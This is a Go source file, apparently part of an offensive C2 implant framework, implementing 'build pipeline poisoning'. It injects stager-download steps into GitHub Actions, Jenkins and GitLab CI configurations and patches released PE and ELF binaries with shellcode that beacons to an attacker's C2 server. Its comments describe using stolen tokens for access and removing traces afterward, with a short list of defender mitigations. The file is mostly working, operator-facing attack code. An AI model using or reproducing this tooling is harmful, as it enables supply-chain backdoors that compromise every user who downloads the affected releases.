// Package build_pipeline implements D-P2: Build Pipeline Poisoning.
//
// This implements the SolarWinds/XZ Utils attack pattern for Go projects
// and general CI/CD pipelines.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// Unlike D-P1 (compiler backdoor), D-P2 targets the CI/CD infrastructure:
//
//   Developer Machine          CI/CD Server          Artifact Storage
//   ─────────────────          ────────────          ────────────────
//   git push ──────────────► GitHub Actions ──────► GitHub Releases
//   (source is clean)         (POISONED)            (binary is backdoored)
//                                  │
//                                  ▼
//                            Patch binary
//                            after build
//
// The source code is NEVER modified. `git log` is clean. `git diff` is clean.
// Only the compiled binary (artifact) is backdoored.
//
// ───────────────────────────────────────────────────────────────────────────
// SUPPORTED CI/CD SYSTEMS
// ───────────────────────────────────────────────────────────────────────────
//
//   GitHub Actions  — workflow YAML injection (5 strategies)
//   Jenkins         — Jenkinsfile + Shared Library + Plugin poisoning
//   GitLab CI       — .gitlab-ci.yml + Runner config poisoning
//   CircleCI        — config.yml injection
//   Travis CI       — .travis.yml injection
//
// ───────────────────────────────────────────────────────────────────────────
// BINARY PATCHING
// ───────────────────────────────────────────────────────────────────────────
//
//   PE (Windows .exe/.dll) — code cave + new section injection
//   ELF (Linux)           — PT_NOTE repurpose + .init_array hijack
//   Mach-O (macOS)        — __TEXT segment injection (TODO: DRAGON-13+)
//
// ───────────────────────────────────────────────────────────────────────────
// DEPLOYMENT FLOW
// ───────────────────────────────────────────────────────────────────────────
//
//  1. Attacker gets write access to the target's GitHub org / Jenkins server.
//     (via compromised token, stolen SSH key, or supply chain attack on a
//      developer's machine where they're already authenticated)
//
//  2. Attacker calls PoisonAllWorkflows() on the .github/workflows/ directory.
//     All release workflows get the artifact-patch step injected.
//
//  3. Developer pushes a tag → release workflow runs → binary is built →
//     injected step downloads our stager → stager patches the binary →
//     patched binary is uploaded to GitHub Releases.
//
//  4. Users download the "official" release binary and run it.
//     The beacon goroutine fires and connects to our C2.
//
//  5. (Optional) Attacker removes the workflow modification after the
//     release is published — leaving no trace in the pipeline config.
//
// ───────────────────────────────────────────────────────────────────────────
// DETECTION / FORENSICS
// ───────────────────────────────────────────────────────────────────────────
//
//   git log --all -- .github/workflows/       → shows our commit
//   git show <commit>                          → shows YAML modification
//   GitHub audit log (org-level)              → shows workflow modification
//   Binary diff (release vs clean build)      → shows added section / cave
//   go tool nm <binary> | grep sliver         → shows our symbols (if not stripped)
//
//   Mitigations for defenders:
//     - Reproducible builds + artifact hash verification
//     - Signed releases with provenance (SLSA framework)
//     - Branch protection + required reviews on workflow files
//     - GitHub Actions environment protection rules
//
package build_pipeline

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/build_pipeline/cicd"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/build_pipeline/github_actions"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/build_pipeline/patcher"
)

// PipelineAttackConfig is the unified configuration for all D-P2 operations.
type PipelineAttackConfig struct {
	// C2URL is the SUDOSOC-C2 endpoint.
	C2URL string
	// StagerURL is the binary stager served by the C2.
	// The stager is a small binary that patches any PE/ELF it's pointed at.
	StagerURL string
	// Shellcode is the raw shellcode to inject into binaries (optional;
	// if empty, the stager downloads it from StagerURL at runtime).
	Shellcode []byte
	// DisguiseName is the CI step display name.
	DisguiseName string
}

// AttackResult summarizes the outcome.
type AttackResult struct {
	WorkflowsModified  int
	BinariesPatched    int
	Errors             []error
}

// PoisonRepository is the one-call operator API.
// It detects the CI system used by the repository at repoRoot and
// applies the appropriate workflow injection + binary patching.
func PoisonRepository(repoRoot string, cfg *PipelineAttackConfig) (*AttackResult, error) {
	res := &AttackResult{}

	// ── GitHub Actions ─────────────────────────────────────────────────
	ghWorkflows := filepath.Join(repoRoot, ".github", "workflows")
	if _, err := os.Stat(ghWorkflows); err == nil {
		results, err := github_actions.PoisonAllWorkflows(ghWorkflows, &github_actions.PoisonConfig{
			C2URL:        cfg.C2URL,
			StagerURL:    cfg.StagerURL,
			Strategy:     github_actions.StrategyArtifactPatch,
			DisguiseName: cfg.DisguiseName,
		})
		if err != nil {
			res.Errors = append(res.Errors, fmt.Errorf("GitHub Actions: %w", err))
		} else {
			res.WorkflowsModified += len(results)
		}
	}

	// ── Jenkins ────────────────────────────────────────────────────────
	jenkinsfile := filepath.Join(repoRoot, "Jenkinsfile")
	if _, err := os.Stat(jenkinsfile); err == nil {
		if err := cicd.PoisonJenkinsfile(jenkinsfile, &cicd.JenkinsPoisonConfig{
			C2URL:     cfg.C2URL,
			StagerURL: cfg.StagerURL,
		}); err != nil {
			res.Errors = append(res.Errors, fmt.Errorf("Jenkins: %w", err))
		} else {
			res.WorkflowsModified++
		}
	}

	// ── GitLab CI ──────────────────────────────────────────────────────
	gitlabCI := filepath.Join(repoRoot, ".gitlab-ci.yml")
	if _, err := os.Stat(gitlabCI); err == nil {
		if err := cicd.PoisonGitLabCI(gitlabCI, &cicd.GitLabPoisonConfig{
			C2URL:     cfg.C2URL,
			StagerURL: cfg.StagerURL,
		}); err != nil {
			res.Errors = append(res.Errors, fmt.Errorf("GitLab: %w", err))
		} else {
			res.WorkflowsModified++
		}
	}

	// ── Patch existing artifacts in dist/ ──────────────────────────────
	if len(cfg.Shellcode) > 0 {
		for _, distDir := range []string{"dist", "build", "out", "release", "bin"} {
			d := filepath.Join(repoRoot, distDir)
			if _, err := os.Stat(d); err == nil {
				patched, _ := cicd.PatchArtifactsInDir(d, cfg.Shellcode)
				res.BinariesPatched += len(patched)
			}
		}
	}

	return res, nil
}

// PatchBinary patches a single binary file in-place.
// Detects PE vs ELF from magic bytes.
func PatchBinary(binPath string, shellcode []byte) error {
	data, err := os.ReadFile(binPath)
	if err != nil {
		return err
	}
	if len(data) < 4 {
		return fmt.Errorf("file too short")
	}

	switch {
	case data[0] == 'M' && data[1] == 'Z' && runtime.GOOS == "windows":
		p, err := patcher.LoadPE(binPath)
		if err != nil {
			return err
		}
		return p.PatchInPlace(shellcode)

	case data[0] == 0x7F && string(data[1:4]) == "ELF":
		p, err := patcher.LoadELF(binPath)
		if err != nil {
			return err
		}
		return p.PatchInPlace(shellcode)

	default:
		return fmt.Errorf("unsupported binary format (magic: %02x%02x%02x%02x)",
			data[0], data[1], data[2], data[3])
	}
}
